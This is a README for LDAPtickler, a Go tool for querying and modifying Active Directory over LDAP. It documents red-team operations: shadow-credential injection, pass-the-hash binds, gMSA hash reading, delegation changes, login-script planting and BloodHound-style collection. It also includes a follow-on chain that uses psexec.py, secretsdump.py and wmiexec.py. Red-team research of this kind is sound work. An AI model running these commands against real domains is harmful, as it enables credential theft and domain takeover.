# LDAPtickler
![LDAPtickler](ldaptickler.png)  
Tickler of LDAP


## What's it for?
This tool is intended to simplify searching LDAP for various objects.  
It will support multiple operating systems out of the box, thanks to it being written in Go.   
Using ldapsearch is somewhat of a drag and I was hoping to provide a tool  
for those so inclined to perform raw ldapsearches that isn't a complete nightmare to use.  
The user of the tool will need to know certain details to use it of course, like the ldap server,  
have an understanding of what bind methods are supported on the endpoint, basedn,and knowledge of valid creds,etc.

This tool has grown significantly to also allow for modification of certain fields that may be useful to a Red Team operator,
as well as the incorporation of many queries for spot checking the configuration of many AD attributes.   
This has been tested extensively against Windows 2025 Server running Active Directory.  
Be extremely careful when arbitrarily modifying or deleting entries in AD, it can lead to all sorts of unexpected behavior.
I personally have destroyed my domain a few times now leveraging this tool. 

This was mainly a research project to better understand AD internals in an LDAP directory.    
Also attempts at learning how to manipulate specific fields and trying to understand some of the more esoteric parts of AD.  

## Installation
You'll need the latest copy of [golang](https://go.dev/dl/) installed.
## To compile
## Linux
```
export GOOS=windows
or
export GOOS=linux
go build ./cmd/ldaptickler/
.\ldaptickler.exe
or
./ldaptickler
```
## Windows
```
$Env:GOOS = "windows"
or
$Env:GOOS = "linux"
go build .\cmd\ldaptickler\
.\ldaptickler.exe 
or
./ldaptickler
```

### Execute without compiling
```
go run ./cmd/ldaptickler/ -s -u slacker -p --dc tip.spinninglikea.top  whoami
```

## Example Usage
```
Usage:
ldaptickler
[OPTIONS] <arg>

DESCRIPTION
    A tool to simplify LDAP queries because it sucks and is not fun

OPTIONS
    -a, --attributes=STRING    Specify attributes for LDAPSearch, ex
                               samaccountname,serviceprincipalname. Usage of
                               this may break things
    -b, --basedn=STRING        Specify baseDN for query, ex. ad.sostup.id would
                               be dc=ad,dc=sostup,dc=id
    -c, --collectors=STRING    Comma-separated list of collectors to run
                               (users,computers,groups,domains,ous,gpos,containers,certtemplates,enterprisecas,aiacas,rootcas,ntauthstores,issuancepolicies)
        --dc=STRING            Identify domain controller
    -D, --debug                Display LDAP equivalent command
    -d, --domain=STRING        Domain for NTLM bind
    -g, --gssapi               Enable GSSAPI and attempt to authenticate
    -h, --help                 Display this help message.
        --insecure             Use ldap:// instead of ldaps://
    -n, --null                 Run collectors without writing files
    -o, --output=STRING        Output zip file path for collectors
    -p                         Password to bind with, will prompt
        --password=STRING      Password to bind with, provided on command line
        --proxy=STRING         SOCKS5 proxy URL (e.g., socks5://127.0.0.1:9050)
        --pth=STRING           Bind with password hash
        --scope=INT            Define scope of search, 0=Base, 1=Single Level,
                               2=Whole Sub Tree, 3=Children, only used by filter
                               and objectquery
    -s, --skip                 Skip SSL verification
    -u, --user=STRING          Username to bind with
    -v, --verbose              Enable verbose output

Supported Utility Commands
    addloginscript <username> <scriptname>                 Adds a login script
                                                           to an account
    addmachine <machinename> <machinepass>                 Adds a new machine to
                                                           the domain
    addmachinelp <machinename> <machinepass>               Adds a new machine
                                                           using low-priv
                                                           credentials
    addshadowcredential <username>                         Adds shadow
                                                           credential and
                                                           generates PFX file in
                                                           current directory
    addspn <accountname> <spn>                             Adds an SPN to an
                                                           account
    adduser <username> <password>                          Creates a new user
    changepassword <accountname> <newpassword>             Changes the password
                                                           for an account
    deleteobject <objectname>                              Deletes an object
                                                           from the directory
    disableconstraineddelegation <accountname>             Disables constrained
                                                           delegation for an
                                                           account
    disableloginscript <username>                          Disables a login
                                                           script by removing it
                                                           from the account
    disablemachine <machinename>                           Disables a machine
                                                           account
    disablerbcd <accountname>                              Disables RBCD for an
                                                           account
    disableshadowcredential <username>                     Removes all shadow
                                                           credentials from the
                                                           account
    disablespn <accountname> <spn>                         Removes an SPN from
                                                           an account
    disableunconstraineddelegation <accountname>           Disables
                                                           unconstrained
                                                           delegation for an
                                                           account
    disableuser <username>                                 Disables a user
                                                           account
    enableconstraineddelegation <accountname> <service>    Enables constrained
                                                           delegation for an
                                                           account
    enablemachine <machinename>                            Enables a machine
                                                           account
    enablespn <accountname> <spn>                          Adds an SPN to an
                                                           account
    enablerbcd <accountname> <delegatingcomputer>          Enables RBCD for an
                                                           account
    enableunconstraineddelegation <accountname>            Enables unconstrained
                                                           delegation for an
                                                           account
    enableuser <username>                                  Enables a user
                                                           account
                                                           

Supported LDAP Queries
    certpublishers             Returns all Certificate Publishers in the domain
    computers                  Lists all computer objects in the domain
    collectbh                  Runs SharpHound-style collectors and packages
                               results into ZIP (use --collectors, --null,
                               --output flags)
    constraineddelegation      Lists accounts configured for constrained
                               delegation
    dnsrecords                 Returns DNS records stored in Active Directory
    domaincontrollers          Lists all domain controllers in the domain
    fsmoroles                  Lists all FSMO roles for the domain
    gmsaaccounts               Lists all Group Managed Service Accounts (gMSAs)
                               in the domain, will dump NTLM hash if you have
                               access
    groups                     Lists all security and distribution groups
    groupswithmembers          Lists groups and their associated members
    kerberoastable             Finds accounts vulnerable to Kerberoasting
    loginscripts               List all configured login scripts by accounts,
                               not including GPOs
    machineaccountquota        Displays the domain's MachineAccountQuota setting
    machinecreationdacl        Displays the domain's Machine Creation DACL
    nopassword                 Lists accounts with empty or missing passwords
    objectquery                Performs a raw LDAP object query
    passworddontexpire         Lists accounts with 'Password Never Expires' set
    passwordchangenextlogin    Lists accounts that must change password at next
                               login
    protectedusers             Lists members of the Protected Users group
    preauthdisabled            Lists accounts with Kerberos pre-authentication
                               disabled
    querydescription           Displays descriptions
    rbcd                       Lists accounts configured for Resource-Based
                               Constrained Delegation (RBCD)
    schema                     Lists schema objects or extended attributes
    search                     Specify your own filter. ex.
                               (objectClass=computer)
    shadowcredentials          Lists users with shadow (msDS-KeyCredential)
                               credentials
    unconstraineddelegation    Lists accounts with unconstrained delegation
                               enabled
    users                      Lists all user accounts in the domain
    whoami                     Runs a whoami-style LDAP query for the current
                               user
                               

AUTHORS
    Chris Hodson r2d2@sostup.id
```
### Anonymous bind 
```
-s = Skip cert verification
--dc = Specify the domain controller
whoami = run whoami as the action
```
```
go run ./cmd/ldaptickler/ -s --dc tip.spinninglikea.top  whoami
[+] Attempting anonymous bind to tip.spinninglikea.top
[+] Successfully connected to tip.spinninglikea.top
[+] Querying the LDAP server for WhoAmI with baseDN DC=spinninglikea,DC=top
[+] You are currently authenticated as {AuthzID:}
```
### NTLM Bind
```
-s = Skip cert verification
-p = Prompt for password
-d = Specify Domain(required for NLTM bind)
-u = username
--dc = Specify the domain controller
whoami = run whoami as the action
```
```
go run ./cmd/ldaptickler/ -s -u slacker -p -d spinninglikea.top --dc tip.spinninglikea.top  whoami
[+] Enter Password:
[+] Attempting NTLM bind to tip.spinninglikea.top
[+] Successfully connected to tip.spinninglikea.top
[+] Querying the LDAP server for WhoAmI with baseDN DC=spinninglikea,DC=top
[+] You are currently authenticated as {AuthzID:u:splat\slacker}
```
### Simple Bind
```
-s = Skip cert verification
-u = username, it may be necessary to pass the domain as well for example, domain\username
-p = Prompt for password
--dc = Specify the domain controller
whoami = run whoami as the action
```
```
go run ./cmd/ldaptickler/ -s -u slacker -p  --dc tip.spinninglikea.top  whoami
[+] Enter Password:
[+] Attempting bind with credentials to tip.spinninglikea.top
[+] Successfully connected to tip.spinninglikea.top
[+] Querying the LDAP server for WhoAmI with baseDN DC=spinninglikea,DC=top
[+] You are currently authenticated as {AuthzID:u:splat\slacker}
```

### List computers
```
-d = Domain
--dc = domain controller
 -s = Skip cert verification
 -u = username
 -p = Prompt for password
 computer = List all computer objects
```

```
go run ./cmd/ldaptickler/ -d spinninglikea.top --dc tip.spinninglikea.top  -s -u lowprivguy -p computers
[+] Enter Password:
[+] Attempting NTLM bind to tip.spinninglikea.top
[+] Successfully connected to tip.spinninglikea.top
[+] Searching for all computers in LDAP with baseDN DC=spinninglikea,DC=top
```


### List users
```
-d = Domain
-g = Enable GSSAPI
--dc = Specify DC
-s = Skip cert verification
-u = username
-p = Prompt for password
users = query users in LDAP
```
```
go run ./cmd/ldaptickler/ -d targetdomain.com -g --dc tip.spinninglikea.top  -s -u lowprivguy -p users
[+] Enter Password:
[+] Attempting GSSAPI bind to tip.spinninglikea.top
[+] Successfully connected to tip.spinninglikea.top
[+] Searching for all users in LDAP with baseDN DC=spinninglikea,DC=top
```

### Search with custom filter
```
--dc = Specify DC
-s = Skip cert verification
-u = username
-p = Prompt for password
users = query users in LDAP
```

```
go run ./cmd/ldaptickler/ --dc tip.spinninglikea.top  -s -u lowprivguy  -p search "(&(samaccountname=Cert Publishers)(member=*))" 
[+] Enter Password:
[+] Attempting bind with credentials to tip.spinninglikea.top
[+] Successfully connected to tip.spinninglikea.top
[+] Searching with specified filter: (&(samaccountname=Cert Publishers)(member=*)) in LDAP with baseDN DC=spinninglikea,DC=top
```

### Bloodhound collector support
```
-d = specify the domain
--dc = specify the domain controller
-p = prompt for password
-u = username
-s = skip cert verification
```
```
go run ./cmd/ldaptickler/ -d spinninglikea.top --dc tip.spinninglikea.top -s -u slacker -p collectbh
[+] Enter Password: 
[+] Attempting NTLM bind to tip.spinninglikea.top
[+] Successfully connected to tip.spinninglikea.top
[+] Running SharpHound-style collectors (collectors=[] dry-run=false) baseDN=DC=spinninglikea,DC=top
[+] Successfully wrote collector output to ldaptickler-20251210-143604.zip
```

### Adding shadow credentials
```
-d = specify the domain
--dc = specify the domain controller
-p = prompt for password
-u = username
-s = skip cert verification
```


```
go run ./cmd/ldaptickler/ -d spinninglikea.top --dc tip.spinninglikea.top -s -u slacker -p addshadowcredential slacker
[+] Enter Password: 
[+] Attempting NTLM bind to tip.spinninglikea.top
[+] Successfully connected to tip.spinninglikea.top
[+] Generating shadow credential PFX for account slacker
[+] Successfully added shadow credential to account slacker
[+] Credential ID: 2b1d8489d59aa4f00f4047ae6f77bdf1
[+] PFX file saved to: ./slacker.pfx
[+] PFX password: a72c37dddcbce5a4d4f15602b42d69bc

[*] Ready to use with gettgtpkinit.py:
    python3 gettgtpkinit.py -cert-pfx ./slacker.pfx -pfx-pass 'a72c37dddcbce5a4d4f15602b42d69bc' spinninglikea.top/slacker output.ccache

[*] With specific DC:
    python3 gettgtpkinit.py -cert-pfx ./slacker.pfx -pfx-pass 'a72c37dddcbce5a4d4f15602b42d69bc' -dc-ip <DC_IP> spinninglikea.top/slacker output.ccache

[*] After obtaining the TGT:
    export KRB5CCNAME=output.ccache
    klist

[*] Use the TGT with impacket tools:
    psexec.py -k -no-pass spinninglikea.top/<HOSTNAME>
    secretsdump.py -k -no-pass spinninglikea.top/<HOSTNAME>
    wmiexec.py -k -no-pass spinninglikea.top/<HOSTNAME>
```

### Disable shadow credentials
```
-d = specify the domain
--dc = specify the domain controller
-p = prompt for password
-u = username
-s = skip cert verification
```
```
go run ./cmd/ldaptickler/ -d spinninglikea.top --dc tip.spinninglikea.top -s -u slacker -p disableshadowcredential slacker
[+] Enter Password: 
[+] Attempting NTLM bind to tip.spinninglikea.top
[+] Successfully connected to tip.spinninglikea.top
[+] Disabling shadow credentials for account slacker
[+] Successfully disabled shadow credentials for account slacker
```
### Read GMSA credentials, if privileged they will display
```
-d = specify the domain
--dc = specify the domain controller
-p = prompt for password
-u = username
-s = skip cert verification
```
```
go run ./cmd/ldaptickler/ -d spinninglikea.top --dc tip.spinninglikea.top -s -u slacker -p gmsaaccounts                   
[+] Enter Password: 
[+] Attempting NTLM bind to tip.spinninglikea.top
[+] Successfully connected to tip.spinninglikea.top
[+] Searching for all Group Managed Service Accounts in LDAP with baseDN DC=spinninglikea,DC=top
```

### Socks proxy example

```
-d = specify the domain
--dc = specify the domain controller
-p = prompt for password
-u = username
-s = skip cert verification
--proxy = specify socks5 proxy
```
```
strace -e connect ./ldaptickler --proxy socks5://127.0.0.1:8000 --dc tip.spinninglikea.top -s -d spinninglikea.top -basedn DC=spinninglikea,DC=top -u slacker -p computers
--- SIGURG {si_signo=SIGURG, si_code=SI_TKILL, si_pid=99603, si_uid=1000} ---
--- SIGURG {si_signo=SIGURG, si_code=SI_TKILL, si_pid=99603, si_uid=1000} ---
[+] Enter Password: --- SIGURG {si_signo=SIGURG, si_code=SI_TKILL, si_pid=99603, si_uid=1000} ---

[+] Attempting NTLM bind to tip.spinninglikea.top
connect(3, {sa_family=AF_INET, sin_port=htons(8000), sin_addr=inet_addr("127.0.0.1")}, 16) = -1 EINPROGRESS (Operation now in progress)
[+] Successfully connected to tip.spinninglikea.top
[+] Searching for all computers in LDAP with baseDN DC=spinninglikea,DC=top
```

## Initial features
- [x] Prompt for user creds  
- [x] Changing a user's password   
- [x] Creation of user accounts
- [x] Modification of Service Principal Names
- [x] Creation of machine accounts
    - [x] Research why only my DA can do this. This is now sorted out. This very much depended on the specific entries being created for the machine account.
- [x] Deletion of User and Machine accounts
- [x] Expand ldapsearch function to take all supported parameters, currently just filter, attributes, basedn, and scope  
- [ ] Store creds in environment variable  
- [x] Refactor
    - [x] Create Library
- [ ] Support Adding and removing of all delegation attributes  
    - [x] Unconstrained - Refactored
    - [x] Constrained  - Refactored
    - [x] Resource Based Constrained Delegation, support has been added for validation, adding and removing. Remove only supports all for now. Need to fix.   
- [x] Support modification of msds-keycredentiallink for shadow credentials  
    - [x] Create self signed cert  
    - [x] Prepare blob for placement in msds-keycredentiallink field  
    - [x] Modify msds-keycredentiallink field   
- [ ] Support creation of DNS entries
- [x] Search and list specific types of objects  
    - [x] Partial support for most useful DNS entries, many other types need work
    - [x] Domain Controllers
    - [x] DNS entries
    - [x] Computers  
    - [x] Users  
    - [x] Groups
    - [x] kerberoastable users
    - [x] user specified
    - [x] Unconstrained ,Constrained Delegation and RBCD
    - [x] Shadow credentials
    - [x] Login scripts
    - [x] GMSA accounts and password
    - [x] Protected Users Group
    - [x] Kerberos Pre-Authenticated Disabled
    - [x] Users who dont require a password
    - [x] Users set to require password change at next login
    - [x] Users set to have the password never expire
    - [ ] Pull down schema - need to research this more, I can pull down the top level, beyond that is HUUUUUGE and am limited by LDAP itself
    - [x] Query description field of all objects
    - [x] Query ms-DS-MachineAccountQuota
    - [x] Query nTSecurityDescriptor field to check top level permissions

- [ ] Support different bind types, Anonymous, Simple Bind, GSSAPI, and SASL  
    - [x] anonymous  
    - [x] simple  
    - [x] ntlm  
    - [x] ntlm with PTH  
    - [x] GSSAPI  
    - [ ] SASL  
- [ ] Support dumping the entire database  
- [x] Support ldaps and ldap  


## Stretch goals

- [x] Allow for deletion, and modification of existing LDAP entries  
- [x] Bloodhound support, collector has equivalent output as sharphound in my test domain, still testing
- [x] Accept plain text password at the command line  
- [ ] Leverage existing users TGT in Windows environment for authentication
- [ ] Local password storage options
- [x] Derive domain from dc so the user doesnt need to provide it
- [ ] Unrolled/effective group membership  
- [ ] Modify scope to be words instead of numbers, easier to recall  
- [x] Provide ldapsearch equivalent for each query  
- [ ] Support more binary fields, DACLs
- [x] Add/del login scripts
- [x] Reading GPOs(supported by collectbh)
- [ ] When searching, store binary and string version of data, dont throw away binary version
- [ ] Useful SCCM queries objectClasses(mSSMS*,mSSMSClient,mSSMSManagementPoint,mSSMSDistributionPoint,mSSMSSite,mSSMSEnvironment(mS-SMS-Site-CODE=*)
- [ ] LAPS support(ms-mcs-admpwd, mslaps-encryptedpassword, mlaps-dsrmpassword attributes)
- [ ] Delegated managed service account(msDS-DelegatedMSAState,msDS-ManagedAccountPrecededByLink,msDS-SupersededAccountState,msDS-SupersededManagedServiceAccountLink)
- [x] Socks proxy support
- [x] FSMO role querying(fSMORoleOwner)
- [ ] Search by provided operating system filter
## Updates
* GSSAPI is now implemented thanks to the latest PRs to the go-ldap package
* BloodHound collector has been implemented  
* Shadowcredential creation and removal is now supported  
* We can read GMSA passwords assuming you are the correct privileged user  
* Deriving basedn from the name of the DC is now supported  
* Adding and deleting login scripts is now supported  
* Plain text password command line support  
* Providing LDAP search equivalent command if you pass -D  
* Socks Proxy 5 support(tested through CobaltStrike beacon)
## Thanks
### Thank you for testing and letting me bounce ideas off of you!
- [mjwhitta](https://github.com/mjwhitta/)     
- [dumpst3rfir3](https://github.com/dumpst3rfir3/)   
- [sludgework](https://github.com/sludgework)  
- [mayyhem](https://github.com/Mayyhem)  

### Without the below packages none of this would be possible
- [go-ldap](https://github.com/go-ldap/ldap)  
- [gokrb5](https://github.com/jcmturner/gokrb5)
